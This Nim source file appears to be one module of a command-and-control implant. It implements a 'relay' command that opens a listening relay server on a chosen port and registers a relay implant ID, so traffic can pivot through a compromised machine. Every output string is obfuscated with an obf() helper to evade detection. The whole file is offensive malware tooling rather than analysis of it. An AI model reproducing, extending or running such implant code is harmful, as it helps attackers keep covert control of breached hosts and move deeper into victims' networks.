import strutils, net
import ../../core/relay/[relay_protocol, relay_comm, relay_config]
import ../../util/strenc

# Global relay server instance
var g_relayServer: RelayServer
var g_relayImplant: RelayImplant

# RELAY command - start relay server on specified port
proc relay*(args: seq[string]): string =
    try:
        if args.len < 1:
            return obf("ERROR: Usage: relay <port>")
        
        let port = parseInt(args[0])
        
        if port < 1 or port > 65535:
            return obf("ERROR: Invalid port number. Must be between 1-65535")
        
        # Check if relay is already running
        if g_relayServer.isListening:
            return obf("ERROR: Relay server already running on port ") & $g_relayServer.port
        
        # Start relay server
        g_relayServer = startRelayServer(port)
        
        if g_relayServer.isListening:
            # Initialize relay implant with unique ID and derived key
            let implantID = generateImplantID("RELAY-" & $port)
            g_relayImplant = initRelayImplant(implantID)
            g_relayImplant.isRelay = true
            g_relayImplant.downstreamPort = port
            
            when defined verbose:
                echo obf("DEBUG: Relay server started on port ") & $port & obf(" with implant ID ") & implantID
            
            return obf("SUCCESS: Relay server started on port ") & $port & obf(". Implant ID: ") & implantID
        else:
            return obf("ERROR: Failed to start relay server on port ") & $port
            
    except ValueError:
        return obf("ERROR: Invalid port number format")
    except:
        let msg = getCurrentExceptionMsg()
        return obf("ERROR: Failed to start relay server. Exception: ") & msg 